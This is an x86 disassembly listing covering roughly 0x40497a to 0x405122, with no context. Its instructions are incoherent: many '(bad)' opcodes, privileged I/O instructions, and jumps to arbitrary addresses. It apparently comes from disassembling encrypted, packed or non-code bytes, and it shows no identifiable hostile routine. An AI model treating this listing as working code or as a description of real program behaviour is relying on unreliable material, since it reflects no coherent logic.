  40497a:	mov    dl,0x40
  40497c:	mov    eax,edi
  40497e:	pop    ss
  40497f:	sbb    bl,0xa6
  404982:	and    DWORD PTR ds:0xb92acc5b,0xffffff8e
  404989:	xchg   esi,ecx
  40498b:	pop    eax
  40498c:	mov    edi,0xd1b2f581
  404991:	push   ds
  404992:	inc    esp
  404993:	sbb    DWORD PTR [ecx+eax*8+0x10e23f86],ebp
  40499a:	adc    al,0xb
  40499c:	jge    0x404a05
  40499e:	sbb    dl,BYTE PTR ds:0xb8337977
  4049a4:	mov    ebp,0x3f6861a3
  4049a9:	pop    es
  4049aa:	jge    0x40498a
  4049ac:	test   dl,bl
  4049ae:	inc    eax
  4049af:	ret    
  4049b0:	mov    edi,ebx
  4049b2:	cmc    
  4049b3:	push   ebx
  4049b4:	pop    esp
  4049b5:	hlt    
  4049b6:	pop    esp
  4049b7:	push   edx
  4049b8:	je     0x4049e1
  4049ba:	xor    BYTE PTR [edi],bh
  4049bc:	les    ecx,FWORD PTR [edi+0x105b57ac]
  4049c2:	sbb    al,0xbd
  4049c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c5:	mov    eax,0x84710413
  4049ca:	push   ss
  4049cb:	ins    DWORD PTR es:[edi],dx
  4049cc:	ret    0xad0e
  4049cf:	stos   BYTE PTR es:[edi],al
  4049d0:	pop    edx
  4049d1:	mov    bl,0xa1
  4049d3:	or     DWORD PTR [edi-0x14784ab5],ebp
  4049d9:	inc    ebx
  4049da:	loope  0x404a07
  4049dc:	fisttp DWORD PTR [ecx]
  4049de:	call   0x7e86f8d9
  4049e3:	js     0x4049d0
  4049e5:	(bad)  
  4049e6:	jns    0x40498c
  4049e8:	cmp    eax,0x85ff19af
  4049ed:	dec    ebx
  4049ee:	call   0x119e16b2
  4049f3:	jae    0x4049fa
  4049f5:	imul   edx,DWORD PTR [ebx],0x7c5c9a1e
  4049fb:	or     eax,0x929acadf
  404a00:	push   0xf322d09b
  404a05:	dec    esi
  404a06:	(bad)  
  404a07:	ja     0x4049fe
  404a09:	seta   BYTE PTR [ecx]
  404a0c:	lahf   
  404a0d:	xchg   bh,al
  404a0f:	or     esp,DWORD PTR [eax]
  404a11:	sub    BYTE PTR [ebx],0xaa
  404a14:	mov    ds:0xf755b8d0,eax
  404a19:	out    0xd0,eax
  404a1b:	leave  
  404a1c:	adc    ah,bh
  404a1e:	cmp    eax,0xa5ad29ba
  404a23:	push   esi
  404a24:	dec    esi
  404a25:	fcomp  QWORD PTR [edi+0x6e]
  404a28:	es hlt 
  404a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a2b:	xchg   DWORD PTR [ebp+0x9cd4fac],edi
  404a31:	out    0x92,eax
  404a33:	fadd   st,st(1)
  404a35:	adc    DWORD PTR [eax+0x63],esi
  404a38:	cmp    BYTE PTR [ebx-0x2408ff02],ch
  404a3e:	les    eax,FWORD PTR [esi-0x2e]
  404a41:	popa   
  404a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a43:	daa    
  404a44:	jmp    DWORD PTR [edi+0x3def3d2b]
  404a4a:	inc    ebp
  404a4b:	mov    bh,0xa2
  404a4d:	or     eax,0xc24c51d3
  404a52:	cmp    edi,DWORD PTR [ebx+0x26]
  404a55:	dec    esp
  404a56:	hlt    
  404a57:	push   0xcddbda2e
  404a5c:	outs   dx,BYTE PTR ds:[esi]
  404a5d:	xchg   esp,eax
  404a5e:	jb     0x404ace
  404a60:	sub    DWORD PTR [ebx],esp
  404a62:	or     BYTE PTR [ebp-0x19dfe9ac],bl
  404a68:	xor    DWORD PTR [edx+0x30],edi
  404a6b:	cdq    
  404a6c:	jecxz  0x404a39
  404a6e:	outs   dx,BYTE PTR ds:[esi]
  404a6f:	das    
  404a70:	pop    edi
  404a71:	dec    esi
  404a72:	mov    eax,ds:0xf55b2d4b
  404a77:	sbb    eax,0x5f41b173
  404a7c:	lds    edi,FWORD PTR [eax-0x71793fb2]
  404a82:	pop    esp
  404a83:	mov    esp,0xb2f02cb5
  404a88:	je     0x404aaa
  404a8a:	jp     0x404a43
  404a8c:	mov    cl,0xd8
  404a8e:	jle    0x404a86
  404a90:	mov    bh,0x72
  404a92:	test   eax,0xe25e4b4e
  404a97:	enter  0x19ca,0xa5
  404a9b:	dec    ebx
  404a9c:	fsubp  st(4),st
  404a9e:	pushf  
  404a9f:	pop    edx
  404aa0:	mov    ds:0x68314b52,al
  404aa5:	pop    ss
  404aa6:	inc    ebx
  404aa7:	push   ebp
  404aa8:	mov    bl,0x15
  404aaa:	scas   eax,DWORD PTR es:[edi]
  404aab:	sub    cl,BYTE PTR [esi-0x7bc1feac]
  404ab1:	int3   
  404ab2:	adc    BYTE PTR [edi-0x57],al
  404ab5:	add    DWORD PTR [eax+0xe],ecx
  404ab8:	xor    ch,BYTE PTR ds:0x9038cd26
  404abe:	dec    BYTE PTR [ebx]
  404ac0:	stos   BYTE PTR es:[edi],al
  404ac1:	out    0xb3,eax
  404ac3:	lock push es
  404ac5:	sub    bl,BYTE PTR [esi-0x31]
  404ac8:	and    BYTE PTR ds:0xe6214295,bh
  404ace:	adc    al,0x2e
  404ad0:	add    BYTE PTR [ebp+0x21fb9caa],dh
  404ad6:	and    BYTE PTR [edx],0xd3
  404ad9:	or     BYTE PTR [ebx+0x7c22aa74],bh
  404adf:	sbb    edx,DWORD PTR [ebx+0x77dc0cc1]
  404ae5:	inc    esp
  404ae6:	sbb    BYTE PTR [ebp+eax*8-0x1f],dh
  404aea:	dec    esp
  404aeb:	dec    esp
  404aec:	jge    0x404b41
  404aee:	outs   dx,BYTE PTR ds:[esi]
  404aef:	out    dx,al
  404af0:	cld    
  404af1:	shl    DWORD PTR ds:0x39162f0b,1
  404af7:	push   eax
  404af8:	or     ebx,edi
  404afa:	jmp    0x370e545e
  404aff:	lods   eax,DWORD PTR ds:[esi]
  404b00:	adc    al,0x5c
  404b02:	dec    esp
  404b03:	sbb    al,0xd1
  404b05:	push   edx
  404b06:	mov    bh,0x2b
  404b08:	jo     0x404b73
  404b0a:	das    
  404b0b:	lahf   
  404b0c:	ins    DWORD PTR es:[edi],dx
  404b0d:	xlat   BYTE PTR ds:[ebx]
  404b0e:	shr    BYTE PTR [eax-0x550f89f6],1
  404b14:	in     eax,0x37
  404b16:	ja     0x404b0a
  404b18:	jne    0x404b3d
  404b1a:	mov    ecx,0x91b4a6ff
  404b1f:	int    0x2e
  404b21:	mov    dl,0xec
  404b23:	out    0x5f,eax
  404b25:	mov    edi,0x74d316e2
  404b2a:	jmp    0x51968d3a
  404b2f:	mov    ds:0x123ccb50,eax
  404b34:	(bad)  
  404b35:	(bad)  
  404b36:	cmp    ah,BYTE PTR [edi+ebp*1]
  404b39:	pusha  
  404b3a:	scas   eax,DWORD PTR es:[edi]
  404b3b:	dec    ebx
  404b3c:	add    BYTE PTR [esi],dh
  404b3e:	ins    BYTE PTR es:[edi],dx
  404b3f:	cdq    
  404b40:	pushf  
  404b41:	mov    dh,dl
  404b43:	lock mov al,ds:0x67c8dedf
  404b49:	repnz icebp 
  404b4b:	adc    esi,DWORD PTR [ecx+0x5eb86a9e]
  404b51:	lea    esi,[esi-0xd]
  404b54:	xor    BYTE PTR [esi-0xa6a92b1],al
  404b5a:	push   edi
  404b5b:	push   es
  404b5c:	imul   ebx,DWORD PTR [ebp+eiz*1+0x5fd06b23],0xb1de2b42
  404b67:	push   ecx
  404b68:	xor    ebx,edx
  404b6a:	jae    0x404bb2
  404b6c:	int    0xad
  404b6e:	or     BYTE PTR [edi],ah
  404b70:	imul   edi,DWORD PTR [ebx-0xe2d238c],0x2b
  404b77:	cmp    BYTE PTR [ebx+0x26],al
  404b7a:	ins    BYTE PTR es:[edi],dx
  404b7b:	mov    bh,0x8
  404b7d:	test   bh,0xd5
  404b80:	pop    es
  404b81:	push   esi
  404b82:	jecxz  0x404b71
  404b84:	dec    BYTE PTR [ebp+eax*2-0x77]
  404b88:	mov    ?,edi
  404b8a:	sub    al,0xf
  404b8c:	rcl    ah,0xa8
  404b8f:	inc    ebx
  404b90:	dec    esi
  404b91:	cdq    
  404b92:	bound  esp,QWORD PTR [eax+0x7129b45d]
  404b98:	mov    esi,0x837a1095
  404b9d:	jbe    0x404b21
  404b9f:	outs   dx,DWORD PTR ds:[esi]
  404ba0:	in     al,0x11
  404ba2:	cmp    DWORD PTR ds:0xb0e1c911,0x39cd1a96
  404bac:	call   FWORD PTR [edi+0x51]
  404baf:	fdivr  DWORD PTR [eax+0x768f679a]
  404bb5:	push   0x42d074d3
  404bba:	adc    dl,dh
  404bbc:	inc    esi
  404bbd:	mov    al,0x85
  404bbf:	fadd   QWORD PTR [eax]
  404bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bc2:	push   0x6
  404bc4:	push   edx
  404bc5:	xor    DWORD PTR ds:0x60e78f6c,ebx
  404bcb:	mov    ch,0x7d
  404bcd:	popf   
  404bce:	(bad)  
  404bcf:	cs cmp al,0x8d
  404bd2:	(bad)  
  404bd4:	xchg   BYTE PTR ds:[esi+eax*8-0x6d],bh
  404bd9:	mov    al,ds:0x9de861b2
  404bde:	dec    ecx
  404bdf:	jo     0x404c24
  404be1:	push   edx
  404be2:	mov    ebp,0x876490a0
  404be7:	mov    edx,0x9dbd80d0
  404bec:	jmp    0x79217978
  404bf1:	xchg   edi,eax
  404bf2:	inc    edi
  404bf3:	(bad)  
  404bf4:	mov    ecx,0x5b847f7e
  404bf9:	lea    ecx,[ecx+0x2e]
  404bfc:	cmc    
  404bfd:	or     dh,BYTE PTR [edx]
  404bff:	sahf   
  404c00:	push   edx
  404c01:	data16 or BYTE PTR [edx+0x3f659701],0x3d
  404c09:	pop    ecx
  404c0a:	addr16 pusha 
  404c0c:	(bad)  
  404c0d:	or     DWORD PTR [esi],edx
  404c0f:	dec    esp
  404c10:	jmp    0xdf1db3f9
  404c15:	dec    edi
  404c16:	repnz xor esi,DWORD PTR [bx+di+0x6548]
  404c1c:	xchg   ebx,eax
  404c1d:	leave  
  404c1e:	(bad)  
  404c1f:	and    ah,cl
  404c21:	outs   dx,DWORD PTR ds:[esi]
  404c22:	mov    edi,0xd9684c09
  404c27:	push   ecx
  404c28:	mov    ah,0x29
  404c2a:	xor    BYTE PTR [ecx-0x18],dl
  404c2d:	adc    bl,BYTE PTR [ebp-0x4f]
  404c30:	popf   
  404c31:	mov    al,ds:0xe2051743
  404c36:	(bad)  
  404c37:	cmp    cl,BYTE PTR [esi]
  404c39:	shr    DWORD PTR [esi],1
  404c3b:	test   BYTE PTR [edi],0x18
  404c3e:	pop    ds
  404c3f:	scas   al,BYTE PTR es:[edi]
  404c40:	rcr    BYTE PTR [edx-0x2769b706],0x8e
  404c47:	mov    al,0xe3
  404c49:	inc    edx
  404c4a:	repz sahf 
  404c4c:	test   DWORD PTR [ebp-0x12f39e9b],ebx
  404c52:	xor    DWORD PTR ds:0xafcf82dd,esi
  404c58:	xor    eax,0x2dbd4484
  404c5d:	mov    WORD PTR [eax],?
  404c5f:	jmp    DWORD PTR [edx]
  404c61:	and    BYTE PTR [esi],al
  404c63:	push   ecx
  404c64:	push   edi
  404c65:	das    
  404c66:	pusha  
  404c67:	pop    ebp
  404c68:	cmc    
  404c69:	mov    eax,0xe904c8cc
  404c6e:	div    DWORD PTR [ebp+0x62d515a0]
  404c74:	or     BYTE PTR [eax+0x2f],0xb0
  404c78:	mov    eax,ds:0x4fce5eaa
  404c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c7e:	mov    edi,0x7c98a081
  404c83:	imul   edx,esi,0xec0bf381
  404c89:	cdq    
  404c8a:	mov    esp,0x8496538c
  404c8f:	adc    ebp,0xffffffdf
  404c92:	mov    edi,0xd3deabef
  404c97:	imul   ebx,DWORD PTR [ebp+0x74],0xffffffbd
  404c9b:	pop    edx
  404c9c:	enter  0x70a4,0x8e
  404ca0:	and    esi,edi
  404ca2:	ds adc eax,0x5fcb97e4
  404ca8:	jno    0x404ccd
  404caa:	ror    bh,cl
  404cac:	inc    esi
  404cad:	xor    dl,BYTE PTR [esi+eiz*2+0x3b7f90bf]
  404cb4:	outs   dx,BYTE PTR ds:[esi]
  404cb5:	jbe    0x404c8a
  404cb7:	in     eax,0x2f
  404cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cba:	aas    
  404cbb:	ss aaa 
  404cbd:	xchg   edx,eax
  404cbe:	pop    ecx
  404cbf:	mov    BYTE PTR [esi-0x5c],bl
  404cc2:	(bad)  
  404cc4:	cli    
  404cc5:	adc    esp,DWORD PTR [ebx+0x7c55658d]
  404ccb:	ins    DWORD PTR es:[edi],dx
  404ccc:	push   es
  404ccd:	or     edi,DWORD PTR ds:0x83d1af96
  404cd3:	lock inc edi
  404cd5:	repz ret 
  404cd7:	jge    0x404c5e
  404cd9:	sub    BYTE PTR [eax+0x6626f4d4],dh
  404cdf:	leave  
  404ce0:	in     eax,0x46
  404ce2:	rcr    BYTE PTR [esi-0x4a],1
  404ce5:	cmp    ah,BYTE PTR [ebp+0x6]
  404ce8:	mov    ch,0x8d
  404cea:	inc    eax
  404ceb:	sbb    ecx,ebx
  404ced:	mov    ch,ah
  404cef:	fwait
  404cf0:	sub    al,0xa2
  404cf2:	imul   eax,DWORD PTR [esp+ecx*2],0x13
  404cf6:	push   es
  404cf7:	out    dx,eax
  404cf8:	mov    ch,0x1a
  404cfa:	cs clc 
  404cfc:	dec    ecx
  404cfd:	neg    DWORD PTR [edi+0x28a1dc66]
  404d03:	mov    bl,0x47
  404d05:	mov    ds,WORD PTR [edx-0x3672c327]
  404d0b:	fucomi st,st(2)
  404d0d:	sbb    DWORD PTR [ebp-0x1],0xd
  404d11:	shl    BYTE PTR [esi-0x7db1f087],0x77
  404d18:	sub    DWORD PTR [esi-0x50],ebx
  404d1b:	or     al,0x4
  404d1d:	dec    esi
  404d1e:	mul    BYTE PTR [esi]
  404d20:	inc    edx
  404d21:	inc    ebx
  404d22:	xchg   ebp,eax
  404d23:	iret   
  404d24:	mov    ds,WORD PTR [eax+0x65c1e73b]
  404d2a:	and    ecx,DWORD PTR [edi]
  404d2c:	sbb    ch,dh
  404d2e:	ss mov ebx,0xa154a2a8
  404d34:	inc    edi
  404d35:	xchg   esp,eax
  404d36:	test   DWORD PTR [edi],ebp
  404d38:	test   eax,0x44fab8fe
  404d3d:	clc    
  404d3e:	push   esp
  404d3f:	iret   
  404d40:	mov    bh,BYTE PTR ds:0x98ff87db
  404d46:	pop    edi
  404d47:	cwde   
  404d48:	shr    esi,cl
  404d4a:	gs jl  0x404da3
  404d4d:	adc    cl,BYTE PTR [ecx+0x9cc16af]
  404d53:	pop    ds
  404d54:	call   0x9d6dd394
  404d59:	sbb    esi,esi
  404d5b:	xor    ah,BYTE PTR [ebp+0x1acdcdee]
  404d61:	aas    
  404d62:	icebp  
  404d63:	adc    ecx,esi
  404d65:	pop    ebx
  404d66:	sbb    eax,eax
  404d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d69:	fwait
  404d6a:	test   edx,0xd78854a2
  404d70:	sbb    esp,esi
  404d72:	outs   dx,BYTE PTR ds:[esi]
  404d73:	adc    al,0xda
  404d75:	imul   eax,ebp,0x4a
  404d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d79:	aas    
  404d7a:	bnd jbe 0x404db8
  404d7d:	jns    0x404d29
  404d7f:	sub    edx,DWORD PTR [esi]
  404d81:	xchg   edx,eax
  404d82:	rcr    DWORD PTR [eax],cl
  404d84:	imul   edx,edi,0xfb9ac631
  404d8a:	adc    BYTE PTR [edx+0x5c],ch
  404d8d:	(bad)  
  404d8e:	xlat   BYTE PTR ds:[ebx]
  404d8f:	cvtps2pd xmm2,QWORD PTR [esi-0x6970a95a]
  404d96:	dec    eax
  404d97:	push   esi
  404d98:	mov    ebp,0x2f835c50
  404d9d:	xchg   DWORD PTR [esp+ebp*8-0x72],ebx
  404da1:	lock push eax
  404da3:	mov    edi,0xeeb4a03d
  404da8:	rcl    DWORD PTR [edi-0x4f],cl
  404dab:	mov    ebx,0x7d28525
  404db0:	mov    ebp,0x78cf9e95
  404db5:	pop    ds
  404db6:	pop    esi
  404db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404db8:	push   ebx
  404db9:	jmp    0x404d7a
  404dbb:	cmp    BYTE PTR [edx+0x5833e5b4],bl
  404dc1:	mov    dh,0xbf
  404dc3:	popa   
  404dc4:	imul   edi,DWORD PTR [eax-0x26],0xffffffcf
  404dc8:	fidiv  DWORD PTR [ecx+ecx*1]
  404dcb:	xlat   BYTE PTR ds:[ebx]
  404dcc:	loopne 0x404d56
  404dce:	dec    esp
  404dcf:	and    eax,0xa4c7de3e
  404dd4:	loope  0x404e33
  404dd6:	scas   eax,DWORD PTR es:[di]
  404dd8:	iret   
  404dd9:	cmp    esp,eax
  404ddb:	mov    al,0xb0
  404ddd:	xchg   eax,edi
  404ddf:	ficomp DWORD PTR [ecx+0x4a91dd97]
  404de5:	aam    0x21
  404de7:	es mov ah,BYTE PTR ss:[esi]
  404deb:	mov    DWORD PTR ds:0x6023fda4,esi
  404df1:	icebp  
  404df2:	jae    0x404e3c
  404df4:	nop
  404df5:	xor    cl,0xec
  404df8:	add    al,0x5d
  404dfa:	adc    BYTE PTR [ebp+0x3395e772],0x4c
  404e01:	push   0xffffffc0
  404e03:	adc    al,0x5a
  404e05:	(bad)  
  404e06:	mov    ecx,0xc0cb71a4
  404e0b:	cdq    
  404e0c:	repz cld 
  404e0e:	cs xchg ebx,eax
  404e10:	addr16 fucom st(0)
  404e13:	lea    edi,[edi]
  404e15:	sbb    dl,cl
  404e17:	jmp    0x404e96
  404e19:	outs   dx,BYTE PTR ds:[esi]
  404e1a:	jp     0x404e50
  404e1c:	not    DWORD PTR [edi+0x30]
  404e1f:	add    BYTE PTR [edi-0x50],cl
  404e22:	dec    edx
  404e23:	push   eax
  404e24:	xor    al,0xc2
  404e26:	pop    eax
  404e27:	mov    ecx,0xa736ac9c
  404e2c:	leave  
  404e2d:	std    
  404e2e:	jge    0x404e4e
  404e30:	in     al,0xd8
  404e32:	ret    0x2542
  404e35:	out    dx,al
  404e36:	xchg   ecx,eax
  404e37:	(bad)  
  404e38:	fbld   TBYTE PTR [esi]
  404e3a:	jb     0x404e27
  404e3c:	pusha  
  404e3d:	test   BYTE PTR [edx*1-0x6e7c30b4],cl
  404e44:	jmp    0x2ac9baeb
  404e49:	xacquire lock add BYTE PTR [edi-0x5f94dd20],ah
  404e51:	ss xor ah,0x3e
  404e55:	arpl   sp,dx
  404e57:	mov    ds:0x48dbd56,al
  404e5c:	push   ecx
  404e5d:	mov    ds:0xb890d890,eax
  404e62:	(bad)  
  404e63:	xor    esp,DWORD PTR [ebp+edx*4-0x4c]
  404e67:	ror    cl,1
  404e69:	pop    edx
  404e6a:	jo     0x404e29
  404e6c:	inc    edi
  404e6d:	and    ax,bp
  404e70:	and    esi,esi
  404e72:	sbb    ecx,ebp
  404e74:	in     al,dx
  404e75:	mov    edx,ebp
  404e77:	mov    al,0xb8
  404e79:	mov    dl,BYTE PTR [eax-0x2a]
  404e7c:	or     ebp,esi
  404e7e:	mov    BYTE PTR ds:0x554e9521,ah
  404e84:	bound  esp,QWORD PTR ds:[ebp+0x562ae184]
  404e8b:	jno    0x404e1d
  404e8d:	sahf   
  404e8e:	out    0xa8,al
  404e90:	inc    eax
  404e91:	xchg   DWORD PTR [eax+0x22e24511],ebx
  404e97:	setne  BYTE PTR [ecx]
  404e9a:	nop
  404e9b:	mov    eax,0x56d463cb
  404ea0:	out    dx,eax
  404ea1:	leave  
  404ea2:	rcl    DWORD PTR [esi+eiz*4],1
  404ea5:	ins    DWORD PTR es:[edi],dx
  404ea6:	push   0xfffffff7
  404ea8:	adc    al,0x3a
  404eaa:	stos   BYTE PTR es:[edi],al
  404eab:	push   edx
  404eac:	mov    esp,DWORD PTR [ebp+0x27]
  404eaf:	mov    esi,0x533a8ff8
  404eb4:	jge    0x404e51
  404eb6:	pusha  
  404eb7:	test   eax,0x81d400fc
  404ebc:	jne    0x404e8f
  404ebe:	call   0x5b61:0x82d9dd9
  404ec5:	pop    esp
  404ec6:	ins    BYTE PTR es:[edi],dx
  404ec7:	adc    edx,edi
  404ec9:	or     DWORD PTR [ebp-0x2ce0d32d],ebx
  404ecf:	xchg   edx,eax
  404ed0:	jae    0x404f21
  404ed2:	add    BYTE PTR [esi],bh
  404ed4:	add    ah,BYTE PTR [edx+0x724e911]
  404eda:	cs push ecx
  404edc:	pop    ecx
  404edd:	addr16 jo 0x404f3e
  404ee0:	outs   dx,BYTE PTR ds:[esi]
  404ee1:	push   edi
  404ee2:	gs ret 0x90dd
  404ee6:	pop    es
  404ee7:	mov    eax,DWORD PTR [edi-0x3026d1c0]
  404eed:	xchg   esi,eax
  404eee:	xchg   DWORD PTR [eax-0x7b],ebx
  404ef1:	adc    DWORD PTR [esi],edi
  404ef3:	pop    edx
  404ef4:	mov    eax,DWORD PTR [esi]
  404ef6:	clc    
  404ef7:	push   0x73032bd5
  404efc:	xchg   edx,eax
  404efd:	lds    edi,FWORD PTR [esi]
  404eff:	dec    esi
  404f00:	les    edx,FWORD PTR [esp+esi*4+0xf4609bf]
  404f07:	jnp    0x404f52
  404f09:	sbb    eax,0xdb6af10
  404f0e:	aaa    
  404f0f:	xor    cl,BYTE PTR [esi+0x781ccf36]
  404f15:	push   esi
  404f16:	sbb    BYTE PTR [ebp*2+0x77020fe2],ah
  404f1d:	(bad)  
  404f1e:	ficomp WORD PTR [ebp+0x4d]
  404f21:	hlt    
  404f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f23:	pop    edi
  404f24:	mov    ah,0x5a
  404f26:	push   edi
  404f27:	push   edx
  404f28:	push   ebp
  404f29:	inc    esp
  404f2a:	dec    BYTE PTR [edi-0x42]
  404f2d:	cmp    dh,0x29
  404f30:	cwde   
  404f31:	push   ebx
  404f32:	or     al,0x45
  404f34:	mov    ebx,0xa9141e47
  404f39:	push   cs
  404f3a:	or     dh,BYTE PTR [eax]
  404f3c:	repz mov dl,0x3a
  404f3f:	pop    ebp
  404f40:	sbb    eax,0x667e6603
  404f45:	push   0x11
  404f47:	in     eax,0x3d
  404f49:	loope  0x404f5a
  404f4b:	mov    al,ch
  404f4d:	inc    DWORD PTR [ebp+0x4b]
  404f50:	inc    esp
  404f51:	enter  0x4d89,0x2e
  404f55:	mov    al,0xe8
  404f57:	loopne 0x404f71
  404f59:	addr16 sbb eax,0x3b7b0d88
  404f5f:	sbb    dl,BYTE PTR gs:[ecx]
  404f62:	push   edx
  404f63:	ret    0xd2f8
  404f66:	fisub  WORD PTR [ecx+0xb]
  404f69:	stos   DWORD PTR es:[edi],eax
  404f6a:	jo     0x404f6b
  404f6c:	mov    DWORD PTR [esi-0x1b],eax
  404f6f:	lea    ecx,[eax+0x7e]
  404f72:	adc    BYTE PTR [esi-0x5],cl
  404f75:	mov    ch,0x9
  404f77:	(bad)  
  404f78:	cs push ebx
  404f7a:	in     al,0x32
  404f7c:	jns    0x404f4c
  404f7e:	dec    edx
  404f7f:	fwait
  404f80:	adc    al,0xe
  404f82:	and    BYTE PTR [esi],0x7e
  404f85:	xchg   ebx,esi
  404f87:	inc    esp
  404f88:	sbb    edx,DWORD PTR [ebx]
  404f8a:	sbb    BYTE PTR [edi],dh
  404f8c:	add    bh,BYTE PTR [ebx+esi*2]
  404f8f:	pop    ebx
  404f90:	and    ch,BYTE PTR [edi-0x75058917]
  404f96:	push   edx
  404f97:	mov    esp,0xc221a59e
  404f9c:	hlt    
  404f9d:	cmp    BYTE PTR [eax+0x46a86387],dh
  404fa3:	push   es
  404fa4:	into   
  404fa5:	adc    al,0xba
  404fa7:	mov    ah,0x18
  404fa9:	hlt    
  404faa:	mov    ecx,esp
  404fac:	xor    al,ah
  404fae:	jns    0x404f5f
  404fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb1:	shr    DWORD PTR [ecx-0x51],1
  404fb4:	repz (bad) 
  404fb6:	jl     0x404f74
  404fb8:	add    eax,0xfbd11187
  404fbd:	jge    0x404ffc
  404fbf:	add    DWORD PTR fs:[ecx+0x66],0x8b999747
  404fc7:	mov    ebx,DWORD PTR [ebx-0x1d]
  404fca:	(bad)  
  404fcb:	or     eax,0xa4a62567
  404fd0:	xchg   esp,eax
  404fd1:	dec    esi
  404fd2:	sbb    cl,BYTE PTR [esi]
  404fd4:	fsincos 
  404fd6:	dec    esp
  404fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fd8:	cmp    BYTE PTR [ecx+0x43],cl
  404fdb:	sbb    al,0xbc
  404fdd:	(bad)  
  404fde:	pop    edx
  404fdf:	cld    
  404fe0:	jge    0x405060
  404fe2:	pop    ebp
  404fe3:	out    dx,al
  404fe4:	adc    BYTE PTR [edx],ah
  404fe6:	and    al,0x6a
  404fe8:	mov    ch,0xdd
  404fea:	cmc    
  404feb:	mov    dh,0xda
  404fed:	ins    BYTE PTR es:[edi],dx
  404fee:	or     dh,BYTE PTR [ebx+0x76]
  404ff1:	mov    BYTE PTR [ebx-0x6afbd185],dl
  404ff7:	call   0xb531:0x7fad0c9c
  404ffe:	xor    bl,BYTE PTR [esp+edi*4-0x77]
  405002:	inc    ebp
  405003:	test   DWORD PTR [esi-0x4d79fb29],0x43bf64f1
  40500d:	jmp    0xc5dc8a25
  405012:	(bad)  
  405013:	push   ss
  405014:	retf   
  405015:	jb     0x404fc3
  405017:	sbb    DWORD PTR [eax+0x2e],esi
  40501a:	mov    ds:0x6b2bec1a,eax
  40501f:	or     cl,BYTE PTR [esi+0x48]
  405022:	xlat   BYTE PTR ds:[ebx]
  405023:	and    al,0xfc
  405025:	add    bh,0x8a
  405028:	jmp    0x1d83d01b
  40502d:	sbb    eax,0x8ef1c981
  405032:	sub    bl,BYTE PTR [edx-0x5f]
  405035:	aas    
  405036:	dec    esi
  405037:	xchg   ebx,eax
  405038:	lea    ebp,ds:0x223ec895
  40503e:	pop    ds
  40503f:	call   0xbb0c:0x6007f34a
  405046:	mov    ah,0xaf
  405048:	jmp    0x404fd6
  40504a:	stos   DWORD PTR es:[edi],eax
  40504b:	scas   eax,DWORD PTR es:[edi]
  40504c:	not    DWORD PTR [eax+ebp*2-0x5a]
  405050:	jo     0x40502c
  405052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405053:	dec    eax
  405054:	jg     0x40506d
  405056:	fwait
  405057:	sbb    ebp,edi
  405059:	dec    eax
  40505a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40505b:	xchg   ebp,eax
  40505c:	push   eax
  40505d:	test   al,0x3c
  40505f:	add    esp,eax
  405061:	rcr    dh,0x47
  405064:	clc    
  405065:	mov    ds:0x4aca625,eax
  40506a:	out    0xa1,eax
  40506c:	add    ah,al
  40506e:	mov    esp,0x9527a850
  405073:	inc    ebp
  405074:	push   ebx
  405075:	fstp   QWORD PTR [ecx+0x6f]
  405078:	pop    ecx
  40507a:	push   edi
  40507b:	lock (bad) 
  40507d:	out    0xff,al
  40507f:	mov    edx,0x89a3646
  405084:	sub    DWORD PTR ds:0x253c7f1,esp
  40508a:	push   esi
  40508b:	hlt    
  40508c:	imul   eax,DWORD PTR [esp+eiz*4-0x6780ecb8],0xffffff9b
  405094:	sub    ebx,ecx
  405096:	(bad)  [esi]
  405098:	dec    edx
  405099:	xchg   BYTE PTR [ebx-0x71be2],ch
  40509f:	jmp    0x40504d
  4050a1:	sub    DWORD PTR [edx+0x34],eax
  4050a4:	(bad)  
  4050a5:	test   BYTE PTR [esi],0x28
  4050a8:	mov    ds:0x852748ab,al
  4050ad:	pop    eax
  4050ae:	mov    ds:0x64cb5167,al
  4050b3:	outs   dx,DWORD PTR ds:[esi]
  4050b4:	imul   esp,DWORD PTR [eax+0x455a1bab],0xda369277
  4050be:	test   BYTE PTR [ebx+0x41],0x84
  4050c2:	xchg   edi,eax
  4050c3:	or     dl,BYTE PTR [esi]
  4050c5:	inc    ebp
  4050c6:	push   esi
  4050c7:	xor    edx,ebx
  4050c9:	std    
  4050ca:	xor    esi,DWORD PTR [edi+0x5]
  4050cd:	or     al,BYTE PTR [edi+0xff4aa0c]
  4050d3:	hlt    
  4050d4:	std    
  4050d5:	enter  0x891e,0x7
  4050d9:	xor    esp,edi
  4050db:	xchg   edi,eax
  4050dc:	aad    0xf
  4050de:	test   BYTE PTR [eax+0x74],bh
  4050e1:	adc    dh,BYTE PTR [edx+eax*4+0x19786a2]
  4050e8:	xor    al,0x2
  4050ea:	das    
  4050eb:	clc    
  4050ec:	inc    esi
  4050ed:	cmp    al,0x6f
  4050ef:	(bad)  
  4050f0:	sub    ebx,DWORD PTR [edx]
  4050f2:	push   es
  4050f3:	mov    ds:0x82fe5a01,al
  4050f8:	sbb    dl,BYTE PTR [ebx+0xe951e3]
  4050fe:	lods   eax,DWORD PTR ds:[esi]
  4050ff:	push   ecx
  405100:	inc    esi
  405101:	sbb    ah,BYTE PTR [eax]
  405103:	mov    ch,0x5a
  405105:	ret    
  405106:	jbe    0x405141
  405108:	add    DWORD PTR [edi-0x9],esi
  40510b:	xor    DWORD PTR [edi],edi
  40510d:	push   ecx
  40510e:	add    cl,BYTE PTR [edi-0x53]
  405111:	xor    eax,ecx
  405113:	retf   
  405114:	mov    cl,0xeb
  405116:	cmp    al,0x8b
  405118:	cmp    bh,bl
  40511a:	mov    esi,0xf2afb8da
  40511f:	outs   dx,DWORD PTR ds:[esi]
  405120:	adc    eax,DWORD PTR [ebx]
  405122:	retf   0x3b11
